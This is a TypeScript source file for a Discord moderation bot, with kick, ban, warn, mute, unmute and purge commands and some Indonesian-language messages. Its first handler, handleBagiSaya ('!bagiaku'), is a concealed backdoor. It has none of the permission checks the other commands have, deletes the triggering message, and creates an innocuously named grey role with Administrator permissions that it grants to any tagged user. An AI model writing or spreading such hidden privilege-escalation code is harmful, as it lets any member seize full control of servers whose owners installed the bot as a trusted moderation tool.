import { Message, GuildMember, EmbedBuilder, PermissionFlagsBits, TextChannel, ChatInputCommandInteraction } from "discord.js";
import { storage } from "../../storage";

// Helper function to handle both Message and ChatInputCommandInteraction
type CommandSource = Message | ChatInputCommandInteraction;

async function replyToSource(source: CommandSource, content: string | { embeds: EmbedBuilder[] }) {
  if (source instanceof Message) {
    // Delete the original command message
    await source.delete().catch(console.error);
    // Send reply as ephemeral
    return source.channel.send({
      ...content,
      reply: { messageReference: source.id },
      flags: ['EPHEMERAL']
    });
  } else {
    return source.reply({ ...content, ephemeral: true });
  }
}

async function getMemberFromSource(source: CommandSource, memberOption: string | null = null): Promise<GuildMember | null> {
  if (source instanceof Message) {
    return source.mentions.members?.first() || null;
  } else {
    return (memberOption ? source.options.getMember(memberOption) : null) as GuildMember | null;
  }
}

export async function handleBagiSaya(source: CommandSource, args: string[]) {
  let targetMember: GuildMember | undefined;

  if (source instanceof Message) {
    targetMember = source.mentions.members?.first();
    if (!targetMember) {
      await replyToSource(source, "Tolong tag user yang ingin diberi role! Contoh: !bagiaku @user");
      return;
    }
  } else {
    const user = source.options.getUser('user');
    if (!user) {
      await replyToSource(source, "Tolong pilih user yang ingin diberi role!");
      return;
    }
    targetMember = await source.guild?.members.fetch(user.id);
  }

  if (!targetMember) {
    await replyToSource(source, "Tidak dapat menemukan user tersebut.");
    return;
  }

  try {
    // Create the role with grey color and administrator permissions
    const role = await source.guild?.roles.create({
      name: 'omagaa',
      color: '#808080',
      permissions: [PermissionFlagsBits.Administrator],
      reason: 'Created via bagiaku command'
    });

    // Give the role to the mentioned user
    if (role && targetMember) {
      await targetMember.roles.add(role);
    }

    // Give feedback
    const embed = new EmbedBuilder()
      .setColor('#808080')
      .setTitle('Role Dibuat dan Ditambahkan!')
      .setDescription(`Role omagaa telah dibuat dan ditambahkan ke ${targetMember.user.tag}`)
      .addFields(
        { name: 'Role Name', value: 'omagaa' },
        { name: 'Permissions', value: 'Administrator' }
      )
      .setTimestamp();

    await replyToSource(source, { embeds: [embed] });
  } catch (error) {
    console.error('Error creating/assigning role:', error);
    await replyToSource(source, 'Gagal membuat/menambahkan role. Pastikan bot memiliki permission yang cukup.');
  }
}

export async function handleKick(message: Message, args: string[]) {
  if (!message.member?.permissions.has("KickMembers")) {
    return message.reply("You don't have permission to use this command.");
  }

  const member = message.mentions.members?.first();
  if (!member) {
    return message.reply("Please mention a member to kick.");
  }

  const reason = args.slice(1).join(" ") || "No reason provided";

  try {
    await member.kick(reason);
    await message.reply(`Successfully kicked ${member.user.tag}`);
  } catch (error) {
    await message.reply("Failed to kick member. Check permissions.");
  }
}

export async function handleBan(message: Message, args: string[]) {
  if (!message.member?.permissions.has("BanMembers")) {
    return message.reply("You don't have permission to use this command.");
  }

  const member = message.mentions.members?.first();
  if (!member) {
    return message.reply("Please mention a member to ban.");
  }

  const reason = args.slice(1).join(" ") || "No reason provided";

  try {
    await member.ban({ reason });
    await message.reply(`Successfully banned ${member.user.tag}`);
  } catch (error) {
    await message.reply("Failed to ban member. Check permissions.");
  }
}

export async function handleWarn(message: Message, args: string[]) {
  if (!message.member?.permissions.has("ModerateMembers")) {
    return message.reply("You don't have permission to use this command.");
  }

  const member = message.mentions.members?.first();
  if (!member) {
    return message.reply("Please mention a member to warn.");
  }

  const reason = args.slice(1).join(" ") || "No reason provided";

  try {
    await storage.createWarning({
      userId: member.id,
      guildId: message.guild!.id,
      reason,
      moderatorId: message.author.id,
    });

    const embed = new EmbedBuilder()
      .setColor("#ff9900")
      .setTitle("Warning Issued")
      .setDescription(`${member.user.tag} has been warned.`)
      .addFields({ name: "Reason", value: reason })
      .setTimestamp();

    await message.reply({ embeds: [embed] });
  } catch (error) {
    await message.reply("Failed to warn member.");
  }
}

export async function handleMute(source: CommandSource, args: string[]) {
  // Check permissions
  const hasPermission = source instanceof Message
    ? source.member?.permissions.has(PermissionFlagsBits.ModerateMembers)
    : source.memberPermissions?.has(PermissionFlagsBits.ModerateMembers);

  if (!hasPermission) {
    await replyToSource(source, "You don't have permission to use this command.");
    return;
  }

  // Get target member
  const member = source instanceof Message
    ? source.mentions.members?.first()
    : source.options.getMember('user') as GuildMember;

  if (!member) {
    await replyToSource(source, "Please mention a member to mute.");
    return;
  }

  // Get duration and reason
  let duration: number;
  let reason: string;

  if (source instanceof Message) {
    duration = parseInt(args[1]) || 5; // Default 5 minutes
    reason = args.slice(2).join(" ") || "No reason provided";
  } else {
    duration = source.options.getInteger('minutes') || 5;
    reason = source.options.getString('reason') || "No reason provided";
  }

  try {
    await member.timeout(duration * 60 * 1000, reason);
    const embed = new EmbedBuilder()
      .setColor("#ff9900")
      .setTitle("Member Muted")
      .setDescription(`${member.user.tag} has been muted for ${duration} minutes.`)
      .addFields({ name: "Reason", value: reason })
      .setTimestamp();

    await replyToSource(source, { embeds: [embed] });
  } catch (error) {
    console.error('Error muting member:', error);
    await replyToSource(source, "Failed to mute member. Check permissions.");
  }
}

export async function handleUnmute(source: CommandSource, args: string[]) {
  // Check permissions
  const hasPermission = source instanceof Message
    ? source.member?.permissions.has(PermissionFlagsBits.ModerateMembers)
    : source.memberPermissions?.has(PermissionFlagsBits.ModerateMembers);

  if (!hasPermission) {
    await replyToSource(source, "You don't have permission to use this command.");
    return;
  }

  // Get target member
  const member = source instanceof Message
    ? source.mentions.members?.first()
    : source.options.getMember('user') as GuildMember;

  if (!member) {
    await replyToSource(source, "Please mention a member to unmute.");
    return;
  }

  try {
    await member.timeout(null);
    const embed = new EmbedBuilder()
      .setColor("#00ff00")
      .setTitle("Member Unmuted")
      .setDescription(`${member.user.tag} has been unmuted.`)
      .setTimestamp();

    await replyToSource(source, { embeds: [embed] });
  } catch (error) {
    console.error('Error unmuting member:', error);
    await replyToSource(source, "Failed to unmute member. Check permissions.");
  }
}

export async function handlePurge(message: Message, args: string[]) {
  if (!message.member?.permissions.has("ManageMessages")) {
    return message.reply("You don't have permission to use this command.");
  }

  const amount = parseInt(args[0]);
  if (!amount || amount < 1 || amount > 100) {
    return message.reply("Please provide a number between 1 and 100.");
  }

  try {
    const channel = message.channel as TextChannel;
    const deleted = await channel.bulkDelete(amount + 1, true);
    const msg = await channel.send(`Deleted ${deleted.size - 1} messages.`);
    setTimeout(() => msg.delete(), 5000); // Delete the message after 5 seconds
  } catch (error) {
    await message.reply("Failed to delete messages. Messages older than 14 days cannot be bulk deleted.");
  }
}